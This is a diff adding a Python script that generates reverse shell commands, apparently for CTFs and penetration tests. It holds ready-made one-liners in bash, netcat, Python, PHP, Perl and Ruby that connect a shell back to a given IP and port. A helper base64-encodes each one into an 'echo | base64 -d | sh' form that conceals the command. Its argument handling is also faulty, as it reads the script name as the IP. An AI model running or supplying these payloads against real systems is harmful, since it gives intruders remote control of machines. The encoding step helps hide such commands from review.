@@ -1,0 +1,82 @@
+#!/usr/bin/python3
+#reverse shell generator
+#quickly generates reverse shells that can be used durings ctfs or in pentest for a quick pivot.
+#Shell templates taken from pentestmonkey.net
+
+from base64 import b64encode
+from subprocess import check_output
+from sys import argv
+
+green = "\033[32m"
+reset = "\033[0m"
+
+templates = {}
+templates['bash'] = 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
+templates['netcat'] = 'nc -e /bin/sh {ip} {port}'
+templates['netcat_missing_-e'] = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'
+templates['python'] = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''
+templates['php'] = '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' '''
+templates['perl'] = '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
+templates['ruby'] = '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
+
+
+def build_b64_cmd(c):
+	return f'echo {b64encode(c.encode()).decode()} | base64 -d | sh'
+
+def get_local_ips():
+	out = []
+	all = check_output('ifconfig',shell=True).decode().split('\n\n')[:-1]
+	for interface in all:
+		name = interface.split(':')[0]
+		if name != 'lo':
+			ip = interface.split('inet')[1].split()[0]
+			out.append((name,ip))
+	return out
+
+def gen_shells(ip,port):
+	for template in templates:
+		cmd = templates[template].format(ip=ip,port=port)
+		encoded = build_b64_cmd(cmd)
+		print(f'{green}\n{template}{reset}:')
+		print(f'clear : {cmd}')
+		print(f'base64: {encoded}')
+
+def main():
+	if len(argv) == 3:
+		ip = argv[0]
+		port = argv[1]
+
+	elif len(argv) == 2:
+		ip = argv[0]
+		port = 666
+
+	elif len(argv) == 1:
+		ips = list(get_local_ips())
+		for ind,e in enumerate(ips):
+			print(f'({ind}) {e[0]} : {e[1]}')
+		while True:
+			try:
+				i = input('ip [0]:')
+				if not i:
+					ip = ips[0][1]
+				else:
+					c = int(i)
+					ip = ips[c][1]
+				break
+			except:
+				print(f'enter a number between 0 and {ind}')
+
+		while True:
+			try:
+				port = input('port [666]:')
+				if not port:
+					port = 666
+				else:
+					port = int(port)
+				break
+			except:
+				pass
+
+	gen_shells(ip,port)
+
+main()
